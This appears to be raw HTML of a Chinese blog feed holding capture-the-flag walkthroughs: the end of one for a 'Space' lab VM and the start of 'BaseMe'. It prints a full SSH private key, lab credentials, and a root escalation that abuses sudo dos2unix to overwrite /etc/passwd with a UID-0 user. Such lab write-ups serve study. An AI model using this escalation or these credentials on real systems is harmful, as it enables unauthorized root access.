~/.ssh/known_hosts:7: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:8: [hashed name]</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.38<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Load key &quot;andeli.id_rsa&quot;: error in libcrypto</span><br><span class="hljs-string">andeli@192.168.2.38&#x27;</span>s password:<br></code></pre></td></tr></table></figure><p>提示<code>Load key &quot;andeli.id_rsa&quot;: error in libcrypto</code></p></li></ul><h2 id="2、CRLF-remove"><a href="#2、CRLF-remove" class="headerlink" title="2、CRLF remove"></a>2、CRLF remove</h2><ul><li>查看私钥里面不可见的字符<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> -A andeli.id_rsa <br>-----BEGIN OPENSSH PRIVATE KEY-----^M$<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn^M$<br>NhAAAAAwEAAQAAAYEA53wtJ27uQatcM+9fP8gZCT7ioVbSmFM5MWZZ+4ZZ/AJswfuI9ndz^M$<br>ADvJgrVgCj2//vHO7Hla0V4S7nHccrFLVuHxzxtcTXiITKmo+S0N0uBu0NdkzFwvmTPqR4^M$<br>tG/p1G6fgt9fms9tqw/A2EYf5Mk/cDv9OwhGldUArQZD9Dd/Zy7ZnRGhBVHm/HTxbwCad0^M$<br>n4Or9+PEUzJb5Uw+GG8A3P0J128BUlIxj4M2/I769q3xSG4EuT9kqAJXCdxAvIzZ6OIfEI^M$<br>9yFoRPbDLEe+95y5zoQpH6Yar5LqiK+X+YnxScWWwCe3r4BQJCiHT7LjIK0HH5YUMkFcr7^M$<br>t9QvNytztJPr2pVQET9UdkiN27u2DCygVw5y1q0rP3fCsEZDCUJxcfjn9PZw5IRzqJcO1B^M$<br>PIFacPpvv/jWI1DA1smd0+xr/AUWEBL4892GZ6hMR4uNLlva2iPoTs4cfZthecXWd0ImCy^M$<br>WcSe6S5pFNWZ+C/u7Td7l46xhlN6Tw/N2n1vQrupAAAFiGVFw9FlRcPRAAAAB3NzaC1yc2^M$<br>EAAAGBAOd8LSdu7kGrXDPvXz/IGQk+4qFW0phTOTFmWfuGWfwCbMH7iPZ3cwA7yYK1YAo9^M$<br>v/7xzux5WtFeEu5x3HKxS1bh8c8bXE14iEypqPktDdLgbtDXZMxcL5kz6keLRv6dRun4Lf^M$<br>X5rPbasPwNhGH+TJP3A7/TsIRpXVAK0GQ/Q3f2cu2Z0RoQVR5vx08W8AmndJ+Dq/fjxFMy^M$<br>W+VMPhhvANz9CddvAVJSMY+DNvyO+vat8UhuBLk/ZKgCVwncQLyM2ejiHxCPchaET2wyxH^M$<br>vvecuc6EKR+mGq+S6oivl/mJ8UnFlsAnt6+AUCQoh0+y4yCtBx+WFDJBXK+7fULzcrc7ST^M$<br>69qVUBE/VHZIjdu7tgwsoFcOctatKz93wrBGQwlCcXH45/T2cOSEc6iXDtQTyBWnD6b7/4^M$<br>1iNQwNbJndPsa/wFFhAS+PPdhmeoTEeLjS5b2toj6E7OHH2bYXnF1ndCJgslnEnukuaRTV^M$<br>mfgv7u03e5eOsYZTek8Pzdp9b0K7qQAAAAMBAAEAAAGADZsS3Fp8zodP6A2Nv6X3Mr/rei^M$<br>gsQJ/DoM+vQkVnTJSn587tAe+LZtwcv/4BIxj2C/oSe3u2hs/MtQ8kMemR0A1/tPiauEL5^M$<br>X+go8lxfj6F5YfUHC6vvcEXI42OgTJ7Z6C6aJPcD346DEI2K1meoAJpoMgIzQdUfkvDPxt^M$<br>ShFo/5uVVtIOcM2bkgMdnbSfX5uNZ4aR2OEIXJOPT+QVlk55hH183CeiAyoYjI1pdg0Nbw^M$<br>c51j0a+ULvvUOdQkSfDNUXD2G7I6UxIYCWOkh2uq0ddPU+Kwe7d12+cnvpub1BEtKAfCTG^M$<br>+NSL8y76bO2u/I7f/kPRzV7Hm4po0X5tZc0fn1tctqV2M+Hu+JoCrs/yVwo0CuA29h/pHh^M$<br>cg1cBzn7jISuDMIAU5l8/nzs4/q/AIfQzqywYUrt04dkcTBmoPyI1QZiD6LufA8L8ZYqQB^M$<br>TrzFsiw/DZNIUBW0XKECr3OQWiaTz44g1YWxKCpFjbXOcR+E25BNAL8eTl3D63OIIBAAAA^M$<br>wCszq5giZqnTab2lVPvtEDePkQHRBZzShp0xm5Ru5kCyzoCrkbyrHH0GhoH77RIItrwd/3^M$<br>XHXtzSAXsWWWiTIkO4zl9xV0dTs85mqeLCSQtS4yG8rz1vMsPCRPysKAo0pXMgvvKHqehl^M$<br>yIU99M3jVPbBiwIuXFGohWr4agxrqMOcsuNIPx3PFmO3lqo08blC+GUBerk8+fiIhkJWe0^M$<br>izzECGHV9xcCoOiwiAdQjr2hNzw9QfnpO/w9uWKmb1397aoQAAAMEA9D47nMj7KvxQtcWz^M$<br>XMXnbqE1Z9EDavrAoA1zZSLrGzJs7jWZyWJuKv450wuf2fqrMCMA0BVngNnS3ljXj04pAg^M$<br>EU5sFE8WOlVNvC9iSd1x5Nmo7DMItdKSHeJop63flzvi+7aNg9VX+qWS4oWMuMZ0m7Vupf^M$<br>mC+xiO+dng7BBFWKIYqrcdWCuBqA6TdOt/qycejhZpTzXzYs/KsmMBjl7uSuUQZu2f6GDl^M$<br>KvCxTjcpE8v7FgSPJv4TNg/DjbEneZAAAAwQDyoLp4Rapn6iXTKFqOAL/8m+uH8dqgB5OD^M$<br>560gxDEgINdYzxwfOz+p3gphSp54MczEJEnYnfvDfKYKR5ty0AXS0iEjEoGAQFXuRjWEQf^M$<br>MeTEb+VqnK/Y5sNXWwW/FVr2tTibwA0QlzQEtOOAceh5HcKrtKpxZjkK2d4odvY6MmbL/J^M$<br>Rtgh4TMV09EokfXACR9F/bNY5Lu+xFMef4NWtXl3e0GEZcoLDSsKCuloOJJoJR/IM1w8gs^M$<br>Bl1Hds+8Z7rpEAAAAMYW5kZWxpQFNwYWNlAQIDBAUGBw==^M$<br>-----END OPENSSH PRIVATE KEY-----^M$<br></code></pre></td></tr></table></figure>每一行后面都有换行符，破坏了密钥结构<br><code>如果是使用复制粘贴，而非wget下载，就不会存在上述的问题</code></li></ul><p>使用命令转换文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# dos2unix andeli.id_rsa            <br>dos2unix: 正在转换文件 andeli.id_rsa 为Unix格式...<br></code></pre></td></tr></table></figure><p>转换后还存在问题，直接复制粘贴秘钥</p><h2 id="3、重新进行ssh登录"><a href="#3、重新进行ssh登录" class="headerlink" title="3、重新进行ssh登录"></a>3、重新进行ssh登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh andeli@192.168.2.38 -i <span class="hljs-built_in">id</span>           <br>Linux Space 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>andeli@Space:~$ <br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-cea97ada-4f00-11f0-af69-57bd20d8ec7c&#125;<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用<code>sudo -l</code>进行查看，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> andeli: <br></code></pre></td></tr></table></figure><h2 id="1、切换到另外一个用户"><a href="#1、切换到另外一个用户" class="headerlink" title="1、切换到另外一个用户"></a>1、切换到另外一个用户</h2><p>查看用户的<code>home</code>目录，发现存在一个<code>user_data.json</code>文件<br>查看发现是一些用户名和密码，同时观察到有一串密码是有颜色的<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506241726083.png"></p><p>查看<code>passwd</code>文件，发现存在一个<code>a3170</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>andeli:x:1000:1000:,,,:/home/andeli:/bin/bash<br>a3170:x:1001:1001:,,,:/home/a3170:/bin/bash<br></code></pre></td></tr></table></figure><p>尝试使用用户<code>a3170</code>和密码<code>31703170317031703170</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ ssh a3170@127.0.0.1<br>The authenticity of host <span class="hljs-string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>127.0.0.1<span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">a3170@127.0.0.1&#x27;</span>s password: <br>Linux Space 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>a3170@Space:~$ <br></code></pre></td></tr></table></figure><h2 id="2、dos2unix提权"><a href="#2、dos2unix提权" class="headerlink" title="2、dos2unix提权"></a>2、dos2unix提权</h2><p>使用<code>sudo -l</code>查看，发现<code>dos2unix</code>不需要密码也可执行<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> a3170 on Space:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User a3170 may run the following commands on Space:<br>    (ALL) NOPASSWD: /usr/bin/dos2unix<br></code></pre></td></tr></table></figure><p>查看<code>dos2unix</code>的使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ /usr/bin/dos2unix -h<br>Usage: dos2unix [options] [file ...] [-n infile outfile ...]<br> --allow-chown         allow file ownership change<br> -ascii                convert only line breaks (default)<br> -iso                  conversion between DOS and ISO-8859-1 character <span class="hljs-built_in">set</span><br>   -1252               use Windows code page 1252 (Western European)<br>   -437                use DOS code page 437 (US) (default)<br>   -850                use DOS code page 850 (Western European)<br>   -860                use DOS code page 860 (Portuguese)<br>   -863                use DOS code page 863 (French Canadian)<br>   -865                use DOS code page 865 (Nordic)<br> -7                    convert 8 bit characters to 7 bit space<br> -b, --keep-bom        keep Byte Order Mark<br> -c, --convmode        conversion mode<br>   convmode            ascii, 7bit, iso, mac, default to ascii<br> -f, --force           force conversion of binary files<br> -h, --<span class="hljs-built_in">help</span>            display this <span class="hljs-built_in">help</span> text<br> -i, --info[=FLAGS]    display file information<br>   file ...            files to analyze<br> -k, --keepdate        keep output file <span class="hljs-built_in">date</span><br> -L, --license         display software license<br> -l, --newline         add additional newline<br> -m, --add-bom         add Byte Order Mark (default UTF-8)<br> -n, --newfile         write to new file<br>   infile              original file <span class="hljs-keyword">in</span> new-file mode<br>   outfile             output file <span class="hljs-keyword">in</span> new-file mode<br> --no-allow-chown      don<span class="hljs-string">&#x27;t allow file ownership change (default)</span><br><span class="hljs-string"> -o, --oldfile         write to old file (default)</span><br><span class="hljs-string">   file ...            files to convert in old-file mode</span><br><span class="hljs-string"> -q, --quiet           quiet mode, suppress all warnings</span><br><span class="hljs-string"> -r, --remove-bom      remove Byte Order Mark (default)</span><br><span class="hljs-string"> -s, --safe            skip binary files (default)</span><br><span class="hljs-string"> -u,  --keep-utf16     keep UTF-16 encoding</span><br><span class="hljs-string"> -ul, --assume-utf16le assume that the input format is UTF-16LE</span><br><span class="hljs-string"> -ub, --assume-utf16be assume that the input format is UTF-16BE</span><br><span class="hljs-string"> -v,  --verbose        verbose operation</span><br><span class="hljs-string"> -F, --follow-symlink  follow symbolic links and convert the targets</span><br><span class="hljs-string"> -R, --replace-symlink replace symbolic links with converted files</span><br><span class="hljs-string">                         (original target files remain unchanged)</span><br><span class="hljs-string"> -S, --skip-symlink    keep symbolic links and targets unchanged (default)</span><br><span class="hljs-string"> -V, --version         display version number</span><br></code></pre></td></tr></table></figure><p>发现参数<code>-n</code>可以写入文件</p><p>尝试修改用户<code>a3170</code>的<code>UID</code>和<code>GID</code>和<code>root</code>一样，然后覆盖<code>/etc/passwd</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd &gt; /tmp/passwd<br>a3170@Space:~$ vi /tmp/passwd<br>a3170@Space:~$ <span class="hljs-built_in">sudo</span> /usr/bin/dos2unix -n /tmp/passwd  /etc/passwd<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>andeli:x:1000:1000:,,,:/home/andeli:/bin/bash<br>a3170:x:0:0:,,,:/home/a3170:/bin/bash<br></code></pre></td></tr></table></figure><p>重新登录用户<code>a3170</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ su a3170<br>Password: <br>root@Space:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Space:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssh私钥CRLF</tag>
      
      <tag>sudo-dos2unix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseMe</title>
    <link href="/Hackmyvm/BaseMe/"/>
    <url>/Hackmyvm/BaseMe/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://hackmyvm.eu/machines/machine.php?vm=BaseME">https://hackmyvm.eu/machines/machine.php?vm=BaseME</a></p><hr><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 11:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00029s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00023s latency).<br>MAC Address: 08:00:27:23:98:C6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00079s latency).<br>MAC Address: 08:00:27:0D:F3:F8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.11 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.37</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>1、全端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.37<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 11:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00037s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:0D:F3:F8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 43.93 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sT -sV -sC -O --min-rate 10000 -p22,80 192.168.2.37<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 11:07 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00072s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)<br>|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)<br>|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)<br>80/tcp open  http    nginx 1.14.2<br>|_http-server-header: nginx/1.14.2<br>|_http-title: Site doesnt have a title (text/html).<br>MAC Address: 08:00:27:0D:F3:F8 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 4.15 - 5.8 (99%), Linux 5.0 - 5.5 (99%), Linux 5.0 - 5.4 (97%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 2.6.32 (96%), Linux 5.4 (95%), Synology DiskStation Manager 5.2-5644 (95%), Linux 3.1 (95%), Linux 3.2 (95%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.75 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、curl-80端口"><a href="#1、curl-80端口" class="headerlink" title="1、curl-80端口"></a>1、curl-80端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 